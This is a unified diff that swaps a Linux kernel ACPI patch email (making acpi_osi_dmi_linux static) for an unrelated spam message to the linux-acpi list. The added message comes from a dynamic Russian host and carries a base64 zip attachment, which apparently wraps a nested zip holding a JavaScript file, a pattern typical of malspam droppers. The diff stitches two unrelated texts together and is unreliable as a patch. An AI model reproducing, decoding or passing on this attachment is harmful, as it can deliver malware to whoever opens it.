@@ -1,47 +1,79 @@
-From: Colin King <colin.king@canonical.com>
-Subject: [PATCH] ACPI / osi: make local function acpi_osi_dmi_linux static
-Date: Thu, 29 Jun 2017 10:49:25 +0100
-Message-ID: <20170629094925.10884-1-colin.king@canonical.com>
+From: <lizdebeth_@hotmail.com>
+Subject: (unknown)
+Date: Thu, 29 Jun 2017 10:39:01 -0000
+Message-ID: <149873274101.29697.11980650508372721398@saturn-internet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="933271400.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from youngberry.canonical.com ([91.189.89.112]:60233 "EHLO
-        youngberry.canonical.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751557AbdF2Jt2 (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Thu, 29 Jun 2017 05:49:28 -0400
+Received: from 178.161.221.13.dyn.v4.saturn-internet.ru ([178.161.221.13]:36866
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751557AbdF2KjF (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>);
+        Thu, 29 Jun 2017 06:39:05 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: "Rafael J . Wysocki" <rjw@rjwysocki.net>, Len Brown <lenb@kernel.org>, linux-acpi@vger.kernel.org
-Cc: kernel-janitors@vger.kernel.org, linux-kernel@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-From: Colin Ian King <colin.king@canonical.com>
-
-The function acpi_osi_dmi_linux is local and does not need to be in
-global scope, so make it static.
-
-Cleans up sparse warning:
-"symbol 'acpi_osi_dmi_linux' was not declared. Should it be static?"
-
-Signed-off-by: Colin Ian King <colin.king@canonical.com>
----
- drivers/acpi/osi.c | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/acpi/osi.c b/drivers/acpi/osi.c
-index 849f9d2245ca..723bee58bbcf 100644
---- a/drivers/acpi/osi.c
-+++ b/drivers/acpi/osi.c
-@@ -265,7 +265,8 @@ static void __init acpi_osi_dmi_darwin(bool enable,
- 	__acpi_osi_setup_darwin(enable);
- }
- 
--void __init acpi_osi_dmi_linux(bool enable, const struct dmi_system_id *d)
-+static void __init acpi_osi_dmi_linux(bool enable,
-+				      const struct dmi_system_id *d)
- {
- 	pr_notice("DMI detected to setup _OSI(\"Linux\"): %s\n", d->ident);
- 	osi_config.linux_dmi = 1;
--- 
-2.11.0
-
+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
+DAAAAAA=
